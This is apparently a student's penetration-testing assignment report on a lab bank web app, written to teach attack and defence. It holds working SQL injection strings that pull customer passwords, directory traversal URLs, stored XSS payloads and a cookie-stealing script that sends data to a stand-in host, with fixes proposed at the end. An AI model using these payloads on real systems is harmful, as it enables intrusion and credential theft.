# Penetration Testing of the Enders & Yang Application

## Penetration Tests Summary

I carried out penetration tests on a web app, the Enders & Yang Bank application. I used the following tools and applications to carry out these tests:

1. Oracle VirtualBox, version 6.0.4r128413 (Qt5.6.2)
2. Mozilla Firefox Quantum, version 65.0
3. Burp Suite Community Edition, version 1.7.36
4. OS running on PC used in carring out the penetration tests: Windows 10 Pro, 64-bit OS

Factors assessed during the penetration testing exercise includes testing error handling by the application; restrictions to improper directory trasversal of the application’s web server; use of common application file names and paths that can be easily guessed; injecting SQL commands and using cross-site scripting techniques to access and retrieve information from the application in an unauthorised manner; switching values stored in cookies of web requests to gain unauthenticated access into the application as different users; testing for appropriate levels of authorisation, access control and session management; checking for cryptography and encryption used in the application; and checking for caching management in the application. The most critical issues I identified includes:

* The ability to improperly traverse the applications web server directory through the application and gain access to the server’s sensitive OS files.
* The use of common file paths and names I the application, which would grant an attacker access to sensitive application files. Also, no application setting in place to prevent an attacker from accessing these files in this manner.
* Not enough mechanisms in place to prevent SQL injection and cross-site scripting attacks.
* No proper user session validation to prevent user switching accounts without being authenticated. And no proper session ID generation and expiry mechanism.
* No restriction in place to prevent an authenticated regular user from accessing the administrative user functions, asides no knowledge of URLs to these functions.

## Penetration Tests Breakdown

### Test 1: Poor Error Handling and Error Messages

* At the locator.asp page of the Enders & Yang Bank website, I entered !@# in the “Search by Zip Code” text-field and clicked on the Search button, which returned the error message, “You must enter at least one zip code digit. Zip codes should only contain numeric values (0-9).” I also entered the value 2.3 in the same text-field, and clicked the Search button. The same error message was shown.
* At the login.asp page of the Enders & Yang Bank web application, I entered *&^% in the “Account Number” text-field, @#$$ in the password text-field, and clicked on the Search button, which returned the error message, “Your CustomerID should consist of only numbers. Your password should consist of only letters and numbers. Call 1-800-EYHELP4 for Customer Support.” If CustomerID is truly a field in the database, the naming convention for the field would make me believe that it is a Microsoft SQL Server database being used. Another feature of the application that lends credence to that is the fact that it is an ASP application, which is typically accompanied with a Microsoft persistence product, like Microsoft Access or Microsoft SQL Server.

### Test 2: Improper Directory Trasversal

* At the disclosure.asp page of the Enders & Yang Bank website, I discovered that “Online Banking Agreement & Disclosures” link and “Checking & Savings Accounts” link both use URL query parameters, “/disclosure.asp?content=html/olb.htm” and “/disclosure.asp?content=html/olb.htm”, respectively, which returns content when clicked. Looking at both URL query parameter values, I could see that “html” is a directory or folder name. In other to test for an insecure direct object reference, I edited the URL in the address bar of my browser, as thus, “/disclosure.asp?content=../windows system.ini” and pressed. The web page returned a Microsoft VBScript runtime message stating that, “Path not found”. I tried again, by prepending an extra “../” to the “content” query parameter value. It still returned the “Path not found” message. After reiterating this step, and when I felt that I had added too many directory traversals to my query value, I went online to search and investigate on Window Servers file structure. Using the search query “system32 folder path windows 2000 server” during my search using Google, I came across a forum post (http://www.tomshardware.co.uk/forum/216369-46-system32-folder-hidden) and a posted answer mentions the path to system32 folder as “c:\winnt\system32”. With this new information, I started my directory traversal test all over again, using “winnt” where I had entered “windows”. My first URL parameter string for the test was thus, “/disclosure.asp?content=../winnt/system.ini”, but again I got the “Path not found” message. For my 2 nd try, I added an extra “../” to traverse an extra step up the directory (“../../winnt/system.ini”), and the message this time was:

; for 16-bit app support [drivers] wave=mmdrv.dll timer=timer.drv [mci] [driver32] [386enh] woafont=dosapp.FON EGA80WOA.FON=EGA80WOA.FON EGA40WOA.FON=EGA40WOA.FON CGA80WOA.FON=CGA80WOA.FON CGA40WOA.FON=CGA40WOA.FON

Which I believe is the content of the server’s /winnt/system.ini file.

### T EST 3: D EFAULT OR E ASILY G UESSABLE P ATHS

At the home page of the Enders & Yang website, I used the “View Page Source” of my
web browser to see the html code for the page, and to search for clues that would aid
my guessing of paths, by looking at the “src” attributes for “img” and “script” tags, and
the “href” attribute for “a” and “link” tags. From these I noticed directory names like
css, js, and images. Using these clues, I tried out the following URLs in my browser to see
what they would return:

The URL http://192.168.56.101/css/ returned to the browser a directory listing,
containing only one file (styles.css).

The URL http://192.168.56.101/images/ returned to the browser a directory
listing, containing 32 image files.

The URL http://192.168.56.101/js/ returned to the browser a directory listing,
containing 3 files (2 JavaScript files and a plaintext file). The plaintext file
(test.txt) made me aware of a test.asp page, which the application did not
provide a navigation link to. I tried navigating to the page directly, by entering
and navigating to http://192.168.56.101/test.asp in my browser, but it returned
a “HTTP 404 page cannot be found” message.

From the directory traversal penetration test process, I know that “html” is a folder in
the application’s directory list. So, I tried navigating to http://192.168.56.101/html/,
which returned to the browser a directory listing containing 4 html files.

From the hint given in the assignment instructions, I tried guessing for the existence of
an “include” folder in the application’s directory, by navigating to
http://192.168.56.101/include/. This returned a “HTTP 404 page cannot be found”
message. I then tried searching for an “includes” folder instead. Navigating to
http://192.168.56.101/includes/ returned to the browser a directory listing containing 4
files with a “.inc” extension. Clicking on the file names allowed me to download and
view the content of each of these files. The files provided some useful information like:

connect.inc – From this file, I could see vital (and probably sensitive) information
like the application’s database connection string, which reveals the address,
127.0.0.1, of data source or database for the application, a user account ID, eycu,
the user account used by the application to connect to the database, and the
password, Not4u2c, for the application’s database user account; and the
software technology involved in connecting to and retrieving data from the
database, i.e. SqlOleDb and ADODb.

cookie.inc – From this file, I got the string, custnum, used to encrypt and decrypt
the cookies of the application.

encode.inc – From this file, I could see the functionalities and source code for
encoding and decoding, used by the application.

session.inc - From this file, I could see that all that is required to keep users of
the application stuck in the login.asp page is to make sure that the “active”
session never holds a value of 1.

T EST 4: SQL I NJECTION

I navigated to the branch locator page to carry out a test search. I had noticed earlier
that the “Search by Zip Code” text-field was validating on the client-side (because the
error message did not require a whole page reload). Therefore, I carried out the test
search by selecting Illinois, and clicking the Search button. The generated POST request
was intercepted using Burp Suite. Under the Raw tab, which is under the Intercept tab,
which is under the Proxy tab, I see the request and the parameters being used by the
request. Switching to the Params tab, I see the body parameters for the POST request,
“searchtype” and “state” and their values. I put in a single apostrophe as the value for
state in an attempt to provoke an SQL Server error. I then click the Forward button.
Switching back to my browser, I see an error message:
Microsoft OLE DB Provider for SQL Server error ‘80040e14’
Unclosed quotation mark before the character string ‘'’.
/locator.asp, line 27

I then carried out another SQL injection test, this time setting the attack string assigned
to the state parameter for the POST request as, il’ HAVING ‘1’ = ‘1 , so as to force
another SQL Server error that might give me information. The browser displayed the
error message, shown below:
Microsoft OLE DB Provider for SQL Server error ‘80040e14’
Column ‘eycu..locator.branchno’ is invalid in the select list because it is not
contained in an aggregate function and there is no GROUP BY clause.
/locator.asp, line 27

From the last test I can see that the application database has a table called “locator”,
and that table has a column called “branchno”. Using this information, I created a new
attack string, il’ GROUP BY locator.branchno HAVING ‘1’ = ‘1 , which I used for my next
SQL injection test. The browser displayed another error message, shown below:
Microsoft OLE DB Provider for SQL Server error ‘80040e14’
5COMP40770 Assignment 4: Penetration Testing

Column ‘eycu..locator.address’ is invalid in the select list because it is not
contained in either an aggregate function or the GROUP BY clause.
/locator.asp, line 27

From the last test, I can identify another column, “address”, belonging to the same
table. I created a new attack string, il’ GROUP BY locator.branchno, locator.address
HAVING ‘1’ = ‘1 , for my next SQL injection test. The browser displayed another error
message, shown below:
Microsoft OLE DB Provider for SQL Server error ‘80040e14’
Column ‘eycu..locator.city’ is invalid in the select list because it is not contained
in either an aggregate function or the GROUP BY clause.
/locator.asp, line 27

From the last test, I identified a new column, “city”, belonging to the same table. I
created a new attack string, il’ GROUP BY locator.branchno, locator.address, locator.city
HAVING ‘1’ = ‘1 , for my next SQL injection test. The browser displayed another error
message, shown below:
Microsoft OLE DB Provider for SQL Server error ‘80040e14’
Column ‘eycu..locator.state’ is invalid in the select list because it is not contained
in either an aggregate function or the GROUP BY clause.
/locator.asp, line 27

From the last test, I identified a new column, “state”, belonging to the same table. I
created a new attack string, il’ GROUP BY locator.branchno, locator.address, locator.city,
locator.state HAVING ‘1’ = ‘1 , for my next SQL injection test. The browser displayed
another error message, shown below:
Microsoft OLE DB Provider for SQL Server error ‘80040e14’
Column ‘eycu..locator.zip’ is invalid in the select list because it is not contained in
either an aggregate function or the GROUP BY clause.

/locator.asp, line 27

From the last test, I identified a new column, “zip”, belonging to the same table. I
created a new attack string, il’ GROUP BY locator.branchno, locator.address, locator.city,
locator.state, locator.zip HAVING ‘1’ = ‘1 , for my next SQL injection test. The browser
displayed another error message, shown below:
Microsoft OLE DB Provider for SQL Server error ‘80040e14’
Column ‘eycu..locator.phone’ is invalid in the select list because it is not
contained in either an aggregate function or the GROUP BY clause.
/locator.asp, line 27

From the last test, I identified a new column, “phone”, belonging to the same table. I
created a new attack string, il’ GROUP BY locator.branchno, locator.address, locator.city,
locator.state, locator.zip, locator.phone HAVING ‘1’ = ‘1 , for my next SQL injection test.
This time, the browser displayed a table holding information of branches in Illinois.

Having identified all the columns of the “locator” table, I created a new attack string
passing an empty value for state and using SQL UNION operator, so as to retrieve a
dataset from the database with nothing from locator table, but instead holding values of
1, ‘ UNION SELECT ‘1’, ‘1’, ‘1’, ‘1’, ‘1’, ‘1 , for my next SQL injection test. The browser
displayed a table used to display information of the branches, but containing only the
header row and a row of fields holding a value of 1.

Having successfully displayed information I injected (the 1s) into the application branch
search process, I next attempt to extract the names of all user created tables from the
application's database. I used the attack string, ‘ UNION SELECT ‘1’, name, ‘1’, ‘1’, ‘1’, ‘1’
FROM sysobjects WHERE xtype = ‘U , for my next SQL injection test. The browser
displayed the branch information holding table, with the names of user created
database tables under the “Address” column, and the rest of the columns filled with 1s.
The table names were “customer”, “dtproperties”, “fresh_postings”, “fresh_responses”,
“locator”, “postings”, and “responses”.

Having successfully retrieved the names of user created database tables, my next SQL
injection test was to try and retrieve login credentials (like usernames or user id's and
their accompanying passwords) to use and gain access into the application directly. I
7COMP40770 Assignment 4: Penetration Testing
Student Number: 18203449

used the attack string, ‘ UNION SELECT ‘1’, TABLE_NAME, COLUMN_NAME, ‘1’, ‘1’, ‘1’
FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = ‘customer , the test.
The browser displayed the branch information holding table, with the table name
“customer” filling up the “Address” column, and the “customer” table column or field
names filling up “City” column. The field names from the “customer” table were
“address”, “begbal”, “city”, “custnum”, “deposits”, “email”, “endbal”, “fname”,
“lname”, “mname”, “password”, “phone”, “state”, “withdrawals”, “zip”.

In the Account Login page (login.asp), the credentials being asked for were an “Account
Number” and “Password". From the retrieved column names from the “customer”
database table, “custnum” and “password” seemed to be the required fields of interest
with regards to the login requirements. Therefore, for my next SQL injection test, I used
the attack string, ‘ UNION SELECT ‘1’, custnum, password, ‘1’, ‘1’, ‘1’ FROM customer -- .
The browser displayed the branch information holding table, showing the data entries
from the “custnum” and “password” fields, in the “Address” and “City” columns
respectively. Randomly picking out 3 sets of “custnum” and “password” information
(“103640176” and “chipper”, “103641196” and “tamiko”, “103643587” and “cardikrx”)
granted me access into the application through the Account Login page.
T EST 5: C ROSS S ITE S CRIPTING

I logged in as a customer (using account number: 103640176, and password: chipper)
and navigated to the customer forum page (forum.asp). To carry out the cross-site
scripting test, I clicked on the “Post a New Item” link in the page. This takes me to the
forumpost.asp page. In the form on this page, I enter in the “Title” text-field, “A Test”,
and in the “Message” text-field, “<script>prompt(‘Is this vulnerable?’);</script>”. I then
clicked on the submit button. This took me back to the forum.asp page. In the table on
this page, holding information about posted forum topics, I see the title of my post at
the top, which appears is now link. Clicking on this link, loads a page with a prompt with
the question “Is this vulnerable?".

I carried out another cross-site scripting test, this time attempting to steal a cookie from
the application. I created a new forum item, entering “I Want a Cookie”, for the “Title”,
and, “Please give me a cookie.<script>alert(document.cookie);</script>”, for the
“Message”. Back on the forum.asp page, clicking on the “Title” link, “I Want a Cookie”,
8COMP40770 Assignment 4: Penetration Testing
Student Number: 18203449
Kingson Chinedu Odogwu

in the table, loads a page with a popup window displaying the application cookie
information. If I had a website of my own, (i.e. mywebsite.com), I could have used the
following string instead, “<script>location.href = ‘http://mywebsite.com/index?item=‘ +
document.cookie);</script>“ which would cause the page to redirect to my website
where I use server-side code to save the cookie item from the “item” URL query
parameter.

In my next cross-site scripting test, I attempted a defacement attack. I created a new
forum item, entering “What is Happening", for the “Title”, and, “<script>var body =
document.body.parentElement; body.innerHTML = “I KNOW WHAT YOU DID LAST
SUMMER!!!”;</script>”, for the “Message". Back on the forum.asp page, clicking on the
“Title” link, “What Is Happening”, in the table, loads a page, which contains only the text
“I KNOW WHAT YOU DID LAST SUMMER!!!”
T EST 6: C OOKIE P OISONING

I logged in as a customer, Darrell Cross (using account number: 103640176, and
password: chipper), and then using Burp Suite, I intercept the request I made to
navigate to the userinfo.asp page, after clicking the “Account Contact Information” link
on the welcome.asp page.

In Burp Suite, under the Params tab, which is under the Intercept tab, which is also
under the Proxy tab, I see 2 Cookies, “ASPSESSIONIDQGQGQIXK” and “custnum”. The
former’s value is a string of alphabets, and the latter’s value is 103640176, Darrell Cross’
account number. I change the “custnum” Cookie value to 103643587, which was one of
the account I had randomly picked out in previous penetration tests. I then click the
Forward button, and return to the browser.

The userinfo.asp page is loaded in the page, but showing the account details for Dale
Thompson, instead of Darrell Cross, because of the changed “custnum” cookie value.
T EST 7: I NADEQUATE A UTHORISATION , A CCESS C ONTROL & S ESSION M ANAGEMENT

In this test I try to guess the name of the page that gives admin access to the
application. I try navigating to administrator.asp by typing
http://192.168.56.101/administrator.asp in the browser address bar and pressed the
Enter key, but that returned a “HTTP 404 - The page cannot be found” message. Next, I
9COMP40770 Assignment 4: Penetration Testing
Student Number: 18203449
Kingson Chinedu Odogwu
4 th February, 2019
try navigating to admin.asp, and I notice that the application redirects me to the
login.asp page.

In the previous test, I was not an authenticated customer in the application. So, I log in
using account number, 103640176, and password, chipper. Then I typed
http://192.168.56.101/admin.asp in the browser address bar and pressed the Enter key.
This page loads, showing the EYCU Forum Administration at the top and a table showing
forum items with a column at the end with “DELETE” links for each item row.

For my next test, I restart my web browser, and then logged in using account number,
103640176, and password, chipper. I then logged out. I clicked the back button, which
took me back to the welcome.asp page. I'm even able to go to the Customer Forum and
post a new item, which makes me certain that the user session is not properly
terminated after the user logs out of the application.

For my next test, I restart my browser again, and then logged in using account number,
103640176, and password, chipper. I make sure the Proxy Interception functionality in
Burp Suite is on, before clicking on the “Account Contact Information” link on the
welcome.asp page. The intercepted request, with its session, I send to the Repeater
functionality in Burp Suite, before I turn off the Proxy Interception functionality. I then
log out of the application. I go to the Repeater page in Burp Suite, still holding the
intercepted session and request, and click on the “Go” button. This results in “HTTP/1.1
200 OK” response, also containing the HTML for the “Account Contact Information”
(userinfo.asp) page requested. Which shows that a user can still gain access into the
application even after logging out, as long as the appropriate session ID can be created
or held.
T EST 8: C RYPTOGRAPHY AND E NCRYPTION U SAGE

While carrying out all of the previous tests and looking around, I noticed that the
application does not apply any form of encryption to its HTTP requests or responses, i.e.
it does not make use of Transport Layer Security (TLS) or Secure Sockets Layer (SSL).

The Ernest & Yang Bank application’s database stores customer accounts’ password in
plain text, which I observered when I was able to retrieve them during the SQL injection
penetration tests.


I logged into the application using account number, 103640176, and password, chipper.
I then make sure the Interception function is on in Burp Suite, before I click on the
“Account Contact Information” link in the welcome.asp page. The intercepted get
request, I send to the Repeater page in Burp Suite. I then turn off the Interception
function in Burp Suite. And then click the Go button in the Repeater page. The response
is shown in the Response pane in the Repeater page. From Response panes, I can see
that “Cache-Control” is set to “private” in the response. I repeated these steps for
navigating from the welcome.asp page to balances.asp page (Account Balances link in
the welcome.asp page) and from welcome.asp to forum.asp page (EYCU Customer
Forum link in the welcome.asp page). “Cache-Control” is set to “private” for the
responses to the request for these two pages.
I DENTIFIED S ECURITY I SSUES AND R ECOMMENDATIONS

The error message encountered in the login.asp page was worded in a manner that
revealed too much in formation. From the error message I could guess that there was
possibly a CustomerID field with a numeric datatype in the application’s database, and
most likely in a table named Customers or something close. This also informs me that
the application is expecting alpha-numeric values for passwords, of which that means
that the no customer password would be containing any special character or space. I
recommend that the error message be changed to something like, “Unrecognised
account number or password. Call 1-800-EYHELP4 for Customer Support.” Also, system
generated application error messages, database connection error messages and errors
related database transactions should not be displayed directly in the application, to the
user.

The application is exposed to directory traversal attacks through the disclosures.asp
page. Because the disclosures.asp page accepts query parameter values that specify file
paths, which also included directory, this made room for abuse by an attacker. Also the
web application’s server was not configured to stop this, which allowed for the abuse.
The abuse includes traversing directories to sensitive data or files in operating system of
the hosting server. I recommend that web pages for the contents being requested with
11COMP40770 Assignment 4: Penetration Testing
Student Number: 18203449
Kingson Chinedu Odogwu
4 th February, 2019
query parameters, be created and linked to directly, instead of using query parameters
to view these contents. Also the application web server should be configured such that
it allows public access to only the directories (or folders) and files required by the
application to function.

The application makes use of simple and easily guessable routes and file paths, which
exposes it to risks, when an attacker familiar with common web application folder
structure and folder names, comes across the application, as I demonstrated in the
penetration tests. I recommend that some form of URL routing functionality be built
into the app, such that when a resource is requested, the route specified in this
resource request is used to match the actual resource file path stored in the server and
thus return as a response. For example, say the following html snippet is found in a web
applications page, <img class=”an_image” src=”img/myimage.jpg” alt=”an image” />,
and this page is request by the browser. When the get request is sent for the image
resource, the application looks up the route, “img/myimage.jpg”, with it’s routing
functionality, and returns the image, whose actualy file path from the root of the web
application, may be something like this, “resources/images/myimage.jpg”. Also, the
application web server should be configured such that public access be granted to only
public resources of the application. The application web server should also be
configured to disable web server directory listing.

The application is vulnerable to SQL injection attacks. This would mean that an
attacker’s hostile input is concantenated or directly used in querying data stored in the
applications database. Through this means, an attacker can retrieve information about
the database, database items and objects, and information stored in the database, some
of which I demonstrated in my penetration test. I recommend that user inputs in web
forms be validated and sanitised, both on the client-side and server-side of the
application, so as to prevent improper inputs from being executed in the database. Also,
use parameters and stored procedures. Also, avoid totally or use to a minimum
concatenating user input into strings used to carry out a database transaction. Also be
wary when using the PL/SQL’s EXECUTE IMMEDIATE or TSQL’s EXEC to execute strings
concantenanted with a user’s input in the database.

The application is vulnerable to cross-site scripting (XSS) attacks. The XSS attack I
discovered was the Stored XSS variant. This enables an attacker to inject code into the
12COMP40770 Assignment 4: Penetration Testing
Student Number: 18203449
Kingson Chinedu Odogwu
4 th February, 2019
application that when executed, can have harmful effects ranging from defacing the
web application to possibly stealing the user’s session ID from the cookie. I recommend
that user inputs in web forms be validated and sanitised, both on the client-side and
server-side of the application, before the input is stored in the database, and escaping
this data before inserting it into the application’s HTML element’s content.

The application is vulnerable to cookie poisoning. This allows for impersonationation of
users of the application and encroachment on their privacy with regards to the
application, through the manipulation of session cookies. I recommend that each user’s
session cookie be generated in a highly random manner, such that the session values
stored in the cookies should never be predictable. And the session values should have a
reasonable expiration time, where by new session values are generated for the user.

The application has a weak implementation of authorisation, access control and session
management. As demonstrated in my penetration tests, this allowed for the possibility
of a regular user accessing administrative pages and administrative functions. This also
allowed for an attacker who has managed to intercept a user’s session ID to gain access
into the application, even after the user has logged out and thus impersonate the user
and encroach on the user’s privacy, and still possibly access the administrative pages
and administrative functions of the application. I recommend that application identify
the types of user as they log in, and based on the kind of user restrict the pages they
have access to. Also, sessions should expire immediately a user logs out of the
application, as well as have a reasonable expiration time.

The application does not apply encryption to it’s HTTP requests and reponses, and to
hashing sensitive information stored in the database. This poses a risk and doesn't
assure users of the protection of the privacy and integrity of the data they exchanged
during interactions with the application. This also could cast doubt on the authenticity
of the application. Also, in the event that unauthorised accessed to the application's
database occurs senisitive information like passwords will be easily comprehensible. I
recommend applying encryption protocols, like TLS with perfect forward ciphers (PFS),
to all HTTP requests and response from the application. Also, use imposing resolutions
like HTTP Strict Transport Security (HSTS) to enforce encryption. I also recommend using
cryptographic hashing functions, like Argon2, bcrypt, PBKDF2, or scrypt, to hash certain
13COMP40770 Assignment 4: Penetration Testing
Student Number: 18203449
Kingson Chinedu Odogwu
4 th February, 2019
sensitive information, like passwords, credit card numbers, etc., which could help
mitigate the problems that would come from unauthorised access.

Since a web browser would attempt to keep local copies of static assets or resources of
a website, which can be good for performance and user experience. With a Cache-
Control header setting of “private”, it means that the resources of the application can
be stored in the browser. This is risky when considering security because an attacker
that has gained full access to a user’s personal computer could possibly use locally
stored browser cache and history to read possibly sensitive and vital information
entered by the user during his or her web session. I recommend caching HTTP responses
from the server be disabled, especially for responses containing sensitive information.
This can done setting the Cache-Control and Pragma response header as shown below:
Cache-control: no-cache, no-store, must-revalidate
Pragma: no-cache
Pragma setting is important when considering user’s that access the application with
older HTTP/1.0 clients (web browsers), which would force these clients to submit a HTTP
request to the origin web server for validation.
